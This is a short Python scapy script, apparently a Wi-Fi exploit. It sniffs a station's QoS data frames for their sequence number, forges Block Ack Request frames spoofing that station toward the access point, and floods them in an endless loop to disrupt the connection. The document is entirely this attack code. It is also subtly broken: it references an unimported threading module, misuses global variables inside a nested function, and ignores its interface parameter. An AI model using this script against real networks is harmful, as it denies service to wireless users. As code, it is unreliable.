from scapy.all import *
import random
from threading import Thread
from time import sleep

def BAR_SC_exploit(targeted_AP, targeted_STA, WNIC):
    dot11 = Dot11(type=1, subtype=8, FCfield=0, addr1=targeted_AP, addr2=targeted_STA, addr3=targeted_AP)
    MAC_header = RadioTap() / dot11

    QoS_found = False
    SN = b''
    BAR_control = b'\x04\x00'


    class Sniffer(threading.Thread):
        def __init__(self, targeted_STA):
            super(Sniffer, self).__init__()
            self.targeted_STA = targeted_STA
       
        def packet_handler(self, pkt):
            global SN, QoS_found
            while QoS_found:
                pass
            if pkt.haslayer(Dot11):
                if pkt.type == 2 and pkt.subtype == 8:
                    print("\n" + pkt.addr1 + " received QoS data from " + pkt.addr2 + "\n")
                    SN = pkt.SC.to_bytes(2, 'little')
                    QoS_found = True
            
        def run(self):
            sniff(iface='wlan0', stop_filter=self.packet_handler, filter="ether dst " + self.targeted_STA)

    sniffer = Sniffer(targeted_STA)
    sniffer.start()
    sleep(10)
    while not QoS_found:
        pass

    frame1 = MAC_header / BAR_control / SN

    print('\n- - - - - - - - - - - - - - - -')
    print('Testing the exploit')
    print('- - - - - - - - - - - - - - - - ')

    while True:
        sendp(frame1, count=128, iface='wlan0', verbose=0)
